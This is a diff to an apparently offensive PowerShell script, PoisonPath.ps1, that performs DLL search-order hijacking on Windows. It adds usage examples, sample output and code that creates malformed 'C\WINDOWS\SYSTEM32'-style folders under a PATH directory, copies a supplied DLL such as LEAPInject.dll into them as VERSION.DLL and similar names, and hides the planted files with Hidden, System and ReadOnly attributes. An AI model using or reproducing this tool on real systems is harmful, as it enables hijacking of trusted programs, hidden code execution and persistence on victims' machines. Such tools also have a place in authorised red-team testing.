@@ -67,7 +67,7 @@ Example 4: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BRUTE -HIDDEN -DLL C:\Tools\L
 As Above, however the brute forced DLL files will be assigned the HIDDEN, SYSTEM, & 
 READONLY attributes.
 
-Example 5: PoisonPath.ps1 -PATH C:\Tools\LEAP\bin -BADNAMES
+Example 5: PoisonPath.ps1 -BRUTE -BADNAMES -HIDDEN -DLL C:\Tools\LEAP\bin\LEAPInject.dll
 
 This will attempt to trigger a DLL Hijack by creating a PATH entry of C:\Tools\LEAP\bin\ as well as
 creating subfolders designed to take advantage of malformed folders searched via bad parsing code + DLLSearchOrder
@@ -78,6 +78,22 @@ examples of these folders are as follows:
 -%PATH%\Windows\System32\
 -%PATH%\C\Windows\System32\
 -%PATH%\System32\
+
+Resulting in Output similar to: 
+Creating Malformed Named Folders to attempt to Hijack DLLSearchOrder
+Created Folder: C:\tools\LEAP\bin\C
+Created Folder: C:\tools\LEAP\bin\WINDOWS
+Created Folder: C:\tools\LEAP\bin\SYSTEM32
+Created Folder: C:\tools\LEAP\bin\C\WINDOWS
+Created Folder: C:\tools\LEAP\bin\C\WINDOWS\SYSTEM32
+Attempting Brute Force DLL Hijacking...
+Planting VERSION.DLL in C:\tools\LEAP\bin\
+Planting VERSION.DLL in C:\tools\LEAP\bin\C
+Planting VERSION.DLL in C:\tools\LEAP\bin\WINDOWS
+Planting VERSION.DLL in C:\tools\LEAP\bin\SYSTEM32
+Planting VERSION.DLL in C:\tools\LEAP\bin\C\WINDOWS
+Planting VERSION.DLL in C:\tools\LEAP\bin\C\WINDOWS\SYSTEM32
+...
 
 #>
 
@@ -174,19 +190,20 @@ if (!(Test-Path $DLL))
 
 if ($BADNAMES)
 {
-    $OrigPath = $Path
+    Write-Host "Creating Malformed Named Folders to attempt to Hijack DLLSearchOrder" -ForegroundColor Red
     foreach ($BADDIR in $BADDIRs)
     {
-        New-Item -ItemType directory -Path $($Path + $BADDIR) -Force
+        New-Item -ItemType directory -Path $($Path + $BADDIR) -Force | Out-Null
+        Write-Host "Created Folder: $($Path + $BADDIR)" -ForegroundColor Green
     }
 }
 
 if ($BRUTE)
 {
-    Write-Host "Attempting Brute Force DLL Hijacking..."
+    Write-Host "Attempting Brute Force DLL Hijacking..." -ForegroundColor Red
     foreach ($dllfile in $DLLs)
     {
-        Write-Host "Planting $dllfile in $Path"
+        Write-Host "Planting $dllfile in $Path" -ForegroundColor Green
         Copy-Item $DLL $($Path + "\" + $dllfile) -Force
         if ($HIDDEN)
         {
@@ -197,11 +214,11 @@ if ($BRUTE)
         {
             foreach ($BADDIR in $BADDIRs)
             {
-                Write-Host "Planting $dllfile in $Path + "\" + $BADDIR"
+                Write-Host "Planting $dllfile in $($Path + $BADDIR)" -ForegroundColor Green
                 Copy-Item $DLL $($Path + "\" + $BADDIR + "\" + $dllfile) -Force
                 if ($HIDDEN)
                 {
-                    $hidefile = Get-Item $($Path + "\" + $dllfile) -Force
+                    $hidefile = Get-Item $($Path + "\" + $BADDIR + $dllfile) -Force
                     $hidefile.Attributes = "Hidden", "System", "ReadOnly"
                 }  
             }
